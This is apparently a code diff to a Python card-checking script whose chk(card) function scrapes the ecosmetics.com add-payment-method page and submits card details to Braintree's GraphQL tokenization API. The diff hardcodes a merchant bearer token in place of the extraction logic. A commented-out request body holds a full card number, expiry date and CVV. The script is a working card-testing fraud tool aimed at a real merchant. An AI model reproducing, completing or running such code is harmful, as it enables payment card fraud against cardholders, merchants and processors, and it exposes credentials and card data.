@@ -205,23 +205,20 @@ def chk(card):
 
 	response = requests.get('https://www.ecosmetics.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
 
-	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
 
-	dec = base64.b64decode(enc).decode('utf-8')
-
-	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
-	
 	
 	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
 
 #6
 
 
+
+
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': f'Bearer {au}',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjQ1NTA2ODAsImp0aSI6ImI3MWVkMjAzLThjZmYtNGUzMS1iYmIzLTMwNzc2MzU4NTIyMCIsInN1YiI6IjdkZmI4NjdkaDluN3FjbXEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjdkZmI4NjdkaDluN3FjbXEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiZWNvc21ldGljc19pbnN0YW50In19.PY2cNR1VDpVYmdUPvS2PSUO0lzvs0_gwNTbZCEjsbouJBUHZ3LFhKcTJlxu-NcoWuvEhlxzX50JN0RqmTF5wdQ',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -241,7 +238,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'd9a33d19-9cbc-4269-8861-b0227cd6f973',
+        'sessionId': '3c8534c0-746d-4178-9b46-6bb8239f1f39',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -265,6 +262,11 @@ def chk(card):
 }
 
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
+# Note: json_data will not be serialized by requests
+# exactly as it was in the original request.
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"3c8534c0-746d-4178-9b46-6bb8239f1f39"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5332480249303415","expirationMonth":"09","expirationYear":"2028","cvv":"381","billingAddress":{"postalCode":"10080","streetAddress":"hhfhfbfv"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 
 	tok = response.json()['data']['tokenizeCreditCard']['token']
 
